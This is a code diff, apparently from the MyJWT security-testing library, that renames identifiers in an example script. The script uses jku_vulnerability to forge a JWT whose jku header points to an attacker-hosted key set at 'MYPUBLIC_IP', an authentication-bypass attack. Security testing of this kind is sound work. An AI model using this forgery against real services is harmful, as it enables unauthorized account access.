@@ -1,4 +1,4 @@
-from MyJWT.vulnerabilities import jkuVulnerability
+from myjwt.vulnerabilities import jku_vulnerability
 
 jwt = (
     "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtMTc5OTRmNTAtMzI5NTg0MTYubGliY3VybC5zby8ud2VsbC1"
@@ -8,7 +8,7 @@ jwt = (
     "M2S__QzllRw_qezS5rzuYlRz-0j0nP_S5gSRcdrR4yNtSO3ivue5mR-RQ"
 )
 
-newJwt = jkuVulnerability(jwt=jwt, url="MYPUBLIC_IP")
+new_jwt = jku_vulnerability(jwt=jwt, url="MYPUBLIC_IP")
 # optionals param file, pem (check documentation).
 # this function will create a new json file for your new jwks (named: jwk-python.json)
 print(jwt)
